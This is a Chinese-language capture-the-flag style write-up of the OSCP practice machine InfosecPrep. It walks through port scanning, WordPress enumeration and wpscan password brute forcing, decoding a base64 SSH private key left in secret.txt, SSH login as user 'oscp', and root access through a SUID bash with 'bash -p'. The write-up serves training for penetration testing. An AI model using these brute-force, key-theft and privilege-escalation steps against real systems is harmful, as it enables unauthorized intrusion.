# OSCP系列靶场-Esay-InfosecPrep

## 总结

getwebshell → 通过目录扫描得到`robots.txt`端点 → `robots.txt`存在敏感目录 →
访问敏感目录得到`base64`加密信息 → 解密得到`ssh`密钥 → 信息收集得到用户名 → 免密`ssh`登录

提 权 思 路 → 内网信息收集 → `suid-bash`直接提权

## 准备工作

  * 启动VPN  
获取攻击机IP → `192.168.45.206`

![](https://image.3001.net/images/20230817/1692258283_64ddcfeb881149af1c9bf.png!small)

  * 启动靶机  
获取目标机器IP → `192.168.152.89`

![](https://image.3001.net/images/20230817/1692258284_64ddcfecb8c3ea962697f.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.152.89
    
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    33060/tcp open  mysqlx
    

![](https://image.3001.net/images/20230817/1692258285_64ddcfed83a3538cce562.png!small)

`开放的端口-→22,80,33060`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80,33060 192.168.152.89
    
    PORT      STATE SERVICE VERSION                                
    22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu 
    80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))         
    
    

![](https://image.3001.net/images/20230817/1692258286_64ddcfee765cc1bab5e6c.png!small)

## 信息收集-端口测试

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
探测版本为`OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 `

    
    
    # 搜索对应脚本
    msf6 → searchsploit OpenSSH 8.2p1
    

无相关漏洞详情

![](https://image.3001.net/images/20230817/1692258287_64ddcfef71b445fa65275.png!small)

#### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

    
    
    ssh root @192.168.152.89 -v
    

显示publickey就是只支持密钥登录

![](https://image.3001.net/images/20230817/1692258288_64ddcff06bf414713a226.png!small)

### 80-HTTP端口的信息收集

访问 `http://192.168.152.89:80`像一个`cms`进行指纹搜集  
![](https://image.3001.net/images/20230817/1692258289_64ddcff1702a541625970.png!small)

#### 信息收集-网站指纹

    
    
    whatweb http://192.168.152.89:80
    

版本号也报了出来，优先尝试通用漏洞 `WordPress 5.4.2`

![](https://image.3001.net/images/20230817/1692258290_64ddcff248994878d2732.png!small)

#### 漏洞利用-网站指纹

    
    
    searchsploit WordPress 5.4.2
    

发现需要插件

![](https://image.3001.net/images/20230817/1692258291_64ddcff3221104da10f6a.png!small)

#### 信息收集-漏洞扫描wpscan

因为`cms`的原因，针对`wordpress`的专用扫描器

    
    
    # -e枚举 ap枚举插件 u枚举用户名 t枚举主题
    wpscan --url http://192.168.152.89:80 --enumerate ap,u,t
    

通过爆破发现了用户名`admin`

![](https://image.3001.net/images/20230817/1692258292_64ddcff41268f634e0649.png!small)  
发现一些没什么大危害的漏洞

![](https://image.3001.net/images/20230817/1692258293_64ddcff5355c407aa9d2d.png!small)

    
    
    # 暴力破解admin密码
    wpscan --url http://192.168.152.89:80 -U admin -P /usr/share/wordlists/rockyou.txt
    

这边挂着我们去研究其他内容

![](https://image.3001.net/images/20230817/1692258294_64ddcff6ab5d2139eb44c.png!small)

#### 信息收集-HTML隐藏信息查看

    
    
    # 包括文章中是否写明一些敏感信息
    curl http://192.168.152.89:80
    

无隐藏信息

![](https://image.3001.net/images/20230817/1692258295_64ddcff7901fc0ea7cb21.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.152.89:80 -x 302,403
    

![](https://image.3001.net/images/20230817/1692258296_64ddcff8dee3e4d99d7da.png!small)  
因为扫出了目录，深层次的扫描待选

    
    
    信息收集-目录扫描(后缀)
    信息收集-目录扫描(深度/大字典)
    信息收集-目录扫描(深度/大字典后缀)
    

#### 信息收集-目录访问

##### /robots.txt端点

访问后得到了一个新的端点`/secret.txt`

##### /secret.txt端点

得到了一串代码，带 == 推测是`base64`

![](https://image.3001.net/images/20230817/1692258297_64ddcff9eea45d0ad267a.png!small)

##### base64解密

    
    
    curl http://192.168.152.89:80/secret.txt | base64 -d
    

解密之后发现是私钥

![](https://image.3001.net/images/20230817/1692258299_64ddcffb61eb7004d0631.png!small)

    
    
    curl http://192.168.152.89:80/secret.txt | base64 -d → is_rsa
    

将其保存成一个文件`is_rsa`方便后续利用

![](https://image.3001.net/images/20230817/1692258300_64ddcffc90fb954dc35bb.png!small)

##### 其他端点

另外端点是wp的端点，因为发现了私钥，所以先待定

### 33060端口的信息收集

从`nmap`探测知道是一个`mysqlx`与`mysql`数据库应该有一定的关联  
不过从80端口我们已经获取了进入的`key`，就不探究33060端口了

## 漏洞利用-getwebshell

### 利用root连接私钥(失败)

获取了`ssh`免密登录的私钥后以为是`root`的，我飘了

    
    
    sudo ssh -i is_rsa root @192.168.152.89 -p22
    

`root`用户不能私钥登录

![](https://image.3001.net/images/20230817/1692258301_64ddcffdc4feadb8fb8bd.png!small)

### 利用admin连接私钥(失败)

想到了`wpscan`收集到的`admin`用户

    
    
    sudo ssh -i is_rsa admin @192.168.152.89 -p22
    

也不行 `G`!

![](https://image.3001.net/images/20230817/1692258302_64ddcffea0e9e13f14071.png!small)

### 爆破用户名(好像没有这工具)

我以为可以用`hyrda`在已知私钥的情况下爆破用户名，好像没这个命令。

### 遗漏的信息收集

我傻了，网站官方上写明了

    
    
    Oh yea! Almost forgot the only user on this box is “oscp”. 
    

唯一的用户是`oscp`

![](https://image.3001.net/images/20230817/1692258303_64ddcfff63dc73834fdae.png!small)

可以尝试利用`oscp`进行爆破

### ssh私钥登录

    
    
    sudo ssh -i is_rsa oscp @192.168.152.89 -p22
    

`ohhhh`能进去但是我权限开大了

![](https://image.3001.net/images/20230817/1692258304_64ddd000636da0255dac9.png!small)

    
    
    chmod 600 is_rsa
    sudo ssh -i is_rsa oscp @192.168.152.89 -p22
    

![](https://image.3001.net/images/20230817/1692258305_64ddd00160fa6bd3eb122.png!small)

## 内网遨游-getshell

### FLAG1获取

    
    
    -bash-5.0$ find / -name local.txt 2→/dev/null
    /home/oscp/local.txt
    -bash-5.0$ cat /home/oscp/local.txt
    10c23c2c5f69e180a3970f10b2a236ef
    

![](https://image.3001.net/images/20230817/1692258306_64ddd002883f9084d8908.png!small)

### 信息收集-内网基础信息收集

提权的本质在于`枚举`，在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测Linux操作系统的发行版本

较老的`Ubuntu`以及Linux系统可以`overlayfs`提权

    
    
    # 确定发行版本
    -bash-5.0$ lsb_release -a
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 20.04 LTS
    Release:        20.04
    Codename:       focal
    

发行版本为`Ubuntu 20.04`，不太能`overlayfs`提权

![](https://image.3001.net/images/20230817/1692258307_64ddd0037be98595ebb4e.png!small)

#### 检测Linux操作系统的内核版本

较低的内核版本可以进行`脏牛`提权

    
    
    -bash-5.0$ uname -a
    Linux oscp 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
    

内核版本为`5.4.0`

#### 列举出所有的sudo文件

查找具有`sudo`权限，且不需要密码的可提权文件  
如果发现`sudo -l`有东西的话 访问 `https://gtfobins.github.io`寻找

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现需要密码

![](https://image.3001.net/images/20230817/1692258308_64ddd0047c56a3079eb25.png!small)

#### 列举出所有suid文件

如果发现`u=s`有东西的话 访问 `https://gtfobins.github.io`寻找

    
    
    # -perm 文件权限
    find / -perm -u=s -type f 2→/dev/null
    
    /snap/core18/1754/bin/umount
    /snap/core18/1754/usr/bin/chfn
    /snap/core18/1754/usr/bin/chsh
    /snap/core18/1754/usr/bin/gpasswd
    /snap/core18/1754/usr/bin/newgrp
    /snap/core18/1754/usr/bin/passwd
    /snap/core18/1754/usr/bin/sudo
    /snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core18/1754/usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/snapd/snap-confine
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/openssh/ssh-keysign
    /usr/bin/gpasswd
    /usr/bin/mount
    /usr/bin/fusermount
    /usr/bin/passwd
    /usr/bin/newgrp
    /usr/bin/at
    /usr/bin/sudo
    /usr/bin/chfn
    /usr/bin/bash
    /usr/bin/pkexec
    /usr/bin/umount
    /usr/bin/chsh
    /usr/bin/su
    

虽然多，重点关注`/usr`目录下发现了`bash`直接会心一笑

![](https://image.3001.net/images/20230817/1692258309_64ddd00553a01d4e36252.png!small)

### 权限提升

#### bash权限提升

![](https://image.3001.net/images/20230817/1692258310_64ddd0066ec8ae11ad8eb.png!small)  
通过查找使用上述命令将直接提权

以下命令将以root身份打开一个bash shell。

    
    
    bash -p
    bash-3.2# id
    uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
    

![](https://image.3001.net/images/20230817/1692258311_64ddd007550e62823dd99.png!small)  
提权成功

### FLAG2获取

    
    
    bash-5.0# cat /root/proof.txt
    abb2ed5f2c5147f3881508eaade611db
    

完结撒花~

![](https://image.3001.net/images/20230817/1692258312_64ddd0082d3505d33f61d.png!small)

## 反思

当我通关提权了，`wpscan`还在扫描，应该用`cewl`生成字典较好，不然太多了

![](https://image.3001.net/images/20230817/1692258312_64ddd008eebc36debd6fa.png!small)

以后应该把网站上的信息收集加入进来

密钥可以再次`base64`，密钥的格式为

    
    
    -----BEGIN OPENSSH PRIVATE KEY-----    内容
    -----END OPENSSH PRIVATE KEY-----    
    
    
    # 针对内容再次base64解密也可以得到用户名
    cat test.txt | baes64 -d
    

![](https://image.3001.net/images/20230817/1692258314_64ddd00a1e9b852c8ce61.png!small)

